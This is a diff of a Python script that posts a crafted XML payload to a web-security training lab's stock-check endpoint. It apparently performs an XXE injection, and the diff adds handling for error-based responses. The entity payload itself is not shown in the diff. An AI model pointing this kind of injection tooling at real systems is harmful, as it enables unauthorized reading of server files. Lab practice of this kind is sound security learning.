@@ -2,15 +2,18 @@
 
 import requests
 from rich.console import Console
+import typer
+import time
 
 
 console = Console()
 
 
-SERVER="https://0af1005b03545d4dc0bf679f00f300e1.web-security-academy.net"
+SERVER="https://0a6e00110488e5afc181ea6700b300d2.web-security-academy.net"
 ENDPOINT="/product/stock"
 
 def inject_xml(server, session):
+
     xml='''<?xml version="1.0" encoding="UTF-8"?>
     INJECT-HERE
     <stockCheck>
@@ -34,12 +37,14 @@ def inject_xml(server, session):
         ]>'''
 
     xml=xml.replace("INJECT-HERE", eval)
-   
+    
     response=session.post(f"{server}{ENDPOINT}", data=xml)
 
-    console.log(f"Post status code {response.status_code}") 
-
-    console.log(response.text)
+    style = "bold white on red"
+    if response.status_code == 400:
+        console.print("error triggered", style=style, justify="center")
+        time.sleep(1)
+        console.log(response.text)
 
 
 def main(server=SERVER):
@@ -47,4 +52,4 @@ def main(server=SERVER):
     inject_xml(server, session)
 
 if __name__ == "__main__":
-    main()
+    typer.run(main)
